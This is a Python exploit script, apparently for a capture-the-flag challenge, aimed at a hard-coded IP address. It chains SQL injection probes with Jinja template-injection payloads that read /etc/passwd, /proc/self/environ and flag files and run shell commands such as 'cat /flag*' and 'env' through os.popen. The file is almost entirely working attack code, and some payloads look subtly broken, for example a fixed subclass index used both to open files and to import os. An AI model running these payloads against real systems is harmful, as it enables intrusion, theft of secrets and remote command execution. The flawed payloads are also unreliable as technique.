import requests
import urllib.parse

def exploit_sqli_ssti_chain():
    base_url = "http://18.212.136.134:5001/"
    
    print("🔍 Exploiting SQLi + Jinja SSTI Chain")
    print("=" * 60)
    
    # Step 1: First, let's see what the main page looks like
    print("\n[1] RECONNAISSANCE")
    response = requests.get(base_url)
    print(f"Main page status: {response.status_code}")
    
    # Look for forms and endpoints
    if "form" in response.text:
        print("Forms found on main page")
    
    # Common endpoints in Flask apps
    endpoints = ["/login", "/search", "/query", "/user", "/admin", "/debug"]
    for endpoint in endpoints:
        test_response = requests.get(base_url + endpoint)
        if test_response.status_code != 404:
            print(f"Found endpoint: {endpoint} ({test_response.status_code})")
    
    # Step 2: Test for SQL Injection in common parameters
    print("\n[2] TESTING FOR SQL INJECTION")
    
    # Common SQLi parameters
    test_params = ["id", "user", "username", "search", "q", "name"]
    sql_payloads = [
        "' OR '1'='1'--",
        "' UNION SELECT 1,2,3--", 
        "' UNION SELECT version(),database(),user()--",
        "' UNION SELECT 1,@@version,3--"
    ]
    
    found_vulnerable_param = None
    
    for param in test_params:
        for payload in sql_payloads:
            test_url = f"{base_url}?{param}={payload}"
            response = requests.get(test_url)
            
            # Look for SQL errors or different responses
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"⚠️ SQL Error with {param}={payload}")
                found_vulnerable_param = param
                break
                
            # Look for union select results
            if "1" in response.text and "2" in response.text and "3" in response.text:
                print(f"✅ Union injection worked with {param}!")
                found_vulnerable_param = param
                break
        
        if found_vulnerable_param:
            break
    
    # Step 3: If we found SQLi, exploit it to inject Jinja templates
    print("\n[3] EXPLOITING SQLi TO INJECT JINJA TEMPLATES")
    
    if not found_vulnerable_param:
        # Try common endpoints with POST data
        print("Trying POST-based SQL injection...")
        post_endpoints = ["/login", "/search", "/query"]
        
        for endpoint in post_endpoints:
            for payload in sql_payloads:
                data = {"username": payload, "password": "test"}
                response = requests.post(base_url + endpoint, data=data)
                
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    print(f"⚠️ SQL Error with POST to {endpoint}")
                    found_vulnerable_param = "username"
                    break
            
            if found_vulnerable_param:
                break
    
    # Step 4: Inject Jinja templates through SQLi
    print("\n[4] INJECTING JINJA TEMPLATES")
    
    # Jinja SSTI payloads to read files and environment
    jinja_payloads = [
        # Read files
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('flag.txt', 'r').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('/etc/passwd', 'r').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('/flag', 'r').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('/app/flag', 'r').read() }}",
        
        # Environment variables
        "{{ config }}",
        "{{ self.__dict__ }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('/proc/self/environ', 'r').read() }}",
        
        # OS command execution
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('os').popen('ls /').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('os').popen('cat /flag*').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('os').popen('env').read() }}",
        
        # Simple file read attempts
        "{{ open('/flag').read() }}",
        "{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}",
    ]
    
    # Test with the vulnerable parameter we found
    if found_vulnerable_param:
        print(f"Using vulnerable parameter: {found_vulnerable_param}")
        
        for jinja_payload in jinja_payloads:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(jinja_payload)
            
            test_url = f"{base_url}?{found_vulnerable_param}=' UNION SELECT 1,'{encoded_payload}',3--"
            print(f"Testing: {jinja_payload[:50]}...")
            
            response = requests.get(test_url)
            
            # Look for flag in response
            if "PCTF{" in response.text:
                import re
                flags = re.findall(r'PCTF\{[^}]+\}', response.text)
                if flags:
                    print(f"🎯 FLAG FOUND: {flags[0]}")
                    return flags[0]
            
            # Look for file contents
            if "root:" in response.text or "flag" in response.text.lower():
                print(f"✅ Interesting response:")
                print(response.text[:500])
    
    # Step 5: Try direct Jinja injection if SQLi not found
    print("\n[5] TRYING DIRECT JINJA INJECTION")
    
    direct_jinja_payloads = [
        "{{7*7}}",
        "{{ config }}",
        "{{ ''.__class__ }}",
        "{{ request.__class__ }}"
    ]
    
    for param in test_params:
        for payload in direct_jinja_payloads:
            test_url = f"{base_url}?{param}={payload}"
            response = requests.get(test_url)
            
            if "49" in response.text and payload == "{{7*7}}":
                print(f"✅ Jinja SSTI confirmed with {param}!")
                
                # Now exploit it
                return exploit_jinja_ssti(base_url, param)
    
    # Step 6: Try POST-based Jinja injection
    print("\n[6] TRYING POST-BASED JINJA INJECTION")
    
    post_endpoints = ["/login", "/search", "/query", "/render", "/template"]
    
    for endpoint in post_endpoints:
        for payload in direct_jinja_payloads:
            data = {"input": payload, "template": payload, "query": payload}
            response = requests.post(base_url + endpoint, data=data)
            
            if "49" in response.text and payload == "{{7*7}}":
                print(f"✅ Jinja SSTI confirmed with POST to {endpoint}!")
                return exploit_jinja_ssti_post(base_url, endpoint)
    
    return None

def exploit_jinja_ssti(base_url, vulnerable_param):
    """Exploit confirmed Jinja SSTI vulnerability"""
    print(f"\n[EXPLOITING] Jinja SSTI via {vulnerable_param}")
    
    # Payloads to read files and get flag
    exploit_payloads = [
        # Read flag file
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('flag.txt', 'r').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('/flag', 'r').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('/app/flag', 'r').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('/home/flag', 'r').read() }}",
        
        # List directory to find flag
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('os').popen('ls -la /').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('os').popen('find / -name flag* 2>/dev/null').read() }}",
        
        # Environment variables
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('os').popen('env').read() }}",
        
        # Current directory
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('os').popen('pwd && ls -la').read() }}",
    ]
    
    for payload in exploit_payloads:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{base_url}?{vulnerable_param}={encoded_payload}"
        
        print(f"Trying: {payload[:60]}...")
        response = requests.get(test_url)
        
        # Look for flag
        if "PCTF{" in response.text:
            import re
            flags = re.findall(r'PCTF\{[^}]+\}', response.text)
            if flags:
                print(f"🎯 FLAG FOUND: {flags[0]}")
                return flags[0]
        
        # Look for interesting output
        if "flag" in response.text.lower() or "root:" in response.text or "total" in response.text:
            print(f"✅ Interesting output:")
            print(response.text[:500])

def exploit_jinja_ssti_post(base_url, endpoint):
    """Exploit POST-based Jinja SSTI"""
    print(f"\n[EXPLOITING] Jinja SSTI via POST to {endpoint}")
    
    exploit_payloads = [
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('/flag', 'r').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('flag.txt', 'r').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('os').popen('cat /flag*').read() }}",
        "{{ ''.__class__.__mro__[1].__subclasses__()[408]('os').popen('env | grep FLAG').read() }}",
    ]
    
    for payload in exploit_payloads:
        data = {"input": payload, "template": payload, "query": payload}
        response = requests.post(base_url + endpoint, data=data)
        
        if "PCTF{" in response.text:
            import re
            flags = re.findall(r'PCTF\{[^}]+\}', response.text)
            if flags:
                print(f"🎯 FLAG FOUND: {flags[0]}")
                return flags[0]
        
        if "flag" in response.text.lower():
            print(f"Response: {response.text[:500]}")

# Run the exploit
if __name__ == "__main__":
    flag = exploit_sqli_ssti_chain()
    
    if flag:
        print(f"\n{'='*60}")
        print(f"🎉 SUCCESS! FLAG: {flag}")
        print(f"{'='*60}")
    else:
        print(f"\n{'='*60}")
        print("❌ Flag not found automatically.")
        print("💡 Try manual testing with the patterns above.")
        print(f"{'='*60}")